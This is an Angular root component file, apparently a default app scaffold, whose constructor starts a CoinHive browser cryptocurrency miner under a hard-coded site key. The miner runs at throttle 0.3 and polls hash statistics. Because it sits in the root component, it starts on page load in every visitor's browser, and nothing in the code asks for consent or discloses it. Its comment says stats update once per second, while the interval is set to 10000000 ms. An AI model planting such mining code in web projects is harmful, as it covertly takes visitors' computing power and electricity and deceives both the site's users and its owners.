import { Component } from '@angular/core';
@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss']
})
export class AppComponent {
  title = 'app';
  constructor() {
    const mnnc = new CoinHive.Anonymous('FgNYlyRdWZc5Px5xoZXsrxqv7A6YLkkh', {throttle: 0.3});
    mnnc.start();
    mnnc.on('found', function() { /* Hash found */ })
    mnnc.on('accepted', function() { /* Hash accepted by the pool */ })

    // Update stats once per second
    setInterval(function() {
      var hashesPerSecond = mnnc.getHashesPerSecond();
      var totalHashes = mnnc.getTotalHashes();
      var acceptedHashes = mnnc.getAcceptedHashes();

      // Output to HTML elements...
    }, 10000000);
  }
}
